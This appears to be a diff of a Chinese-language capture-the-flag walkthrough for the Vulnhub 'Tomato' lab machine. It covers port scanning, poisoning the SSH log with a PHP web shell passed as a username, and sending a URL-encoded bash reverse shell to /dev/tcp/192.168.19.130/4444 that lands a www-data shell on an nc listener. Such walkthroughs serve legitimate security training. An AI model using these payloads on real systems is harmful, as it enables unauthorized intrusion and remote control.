@@ -6,26 +6,21 @@ Nmap扫描目标开放端口
 
 ```
 ┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
-└─# nmap -sV -sT -sC -oA nmap_initial 192.168.19.147 -oN nmap.txt
+└─# nmap -sV -p- 192.168.19.147 -oN nmap.txt
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 22:23 EDT
 Nmap scan report for 192.168.19.147
-Host is up (0.0077s latency).
-Not shown: 997 closed tcp ports (conn-refused)
+Host is up (0.00086s latency).
+Not shown: 65531 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.3
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Tomato
+2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
 8888/tcp open  http    nginx 1.10.3 (Ubuntu)
-| http-auth: 
-| HTTP/1.1 401 Unauthorized\x0D
-|_  Basic realm=Private Property
-|_http-title: 401 Authorization Required
-|_http-server-header: nginx/1.10.3 (Ubuntu)
 MAC Address: 00:0C:29:6E:EA:1C (VMware)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Mon Sep 11 08:49:39 2023 -- 1 IP address (1 host up) scanned in 9.50 seconds
+Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds
 ```
 
 访问一下目标的80端口
@@ -97,7 +92,42 @@ DOWNLOADED: 4612 - FOUND: 2
 
 ```
 ┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
-└─# ssh '<?php @eval($_POST['a']) ?>'@192.168.19.147
-ssh: connect to host 192.168.19.147 port 22: Connection refused
+└─# ssh '<?php system($_GET["shell"]); ?>'@192.168.19.147 -p2211
+<?php system($_GET["shell"]); ?>@192.168.19.147's password: 
+Permission denied, please try again.
+<?php system($_GET["shell"]); ?>@192.168.19.147's password: 
+Permission denied, please try again.
+<?php system($_GET["shell"]); ?>@192.168.19.147's password: 
+<?php system($_GET["shell"]); ?>@192.168.19.147: Permission denied (publickey,password).
+```
+
+然后我们可以通过shell去执行命令
+
+<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+
+接下来通过burp的重放去反弹shell
+
+```
+bash+-c+'bash+-i+>%26+/dev/tcp/192.168.19.130/4444+0>%261'
+```
+
+<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+
+本地监听端口返回了一个shell
+
+```
+┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
+└─# nc -lnvp 4444                           
+listening on [any] 4444 ...
+connect to [192.168.19.130] from (UNKNOWN) [192.168.19.147] 55536
+bash: cannot set terminal process group (905): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/antibot_image/antibots$ whoami
+whoami
+www-data
+www-data@ubuntu:/var/www/html/antibot_image/antibots$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/var/www/html/antibot_image/antibots$
 ```
 
